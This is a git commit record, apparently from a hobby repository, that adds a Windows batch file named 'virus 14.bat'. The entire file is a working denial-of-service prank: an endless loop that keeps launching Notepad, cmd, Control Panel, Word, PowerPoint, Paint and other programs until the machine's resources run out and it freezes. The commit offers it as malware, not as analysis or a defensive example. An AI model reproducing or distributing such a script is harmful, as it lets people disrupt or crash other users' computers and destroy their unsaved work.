ee1b87b33ae28a85c2d740b1e219287e512e8bf5
HackScribe <135351214+HackScribe@users.noreply.github.com>
2023-06-02 17:18:02 +0200

    virus 14.bat

---
+++ virus 14.bat
@@ -0,0 +1,14 @@
+@echo off
+:rookie
+start %systemroot%\system32\notepad.exe
+start %systemroot%\system32\cmd.exe
+start %systemroot%\system32\control.exe
+start %systemroot%\system32\write.exe
+start %systemroot%\winhlp32.exe
+start %systemroot%\Boot\DVD\PCAT\etfsboot.com
+start winword
+start cmd
+start powerpnt
+start pbrush
+start notepad
+goto rookie
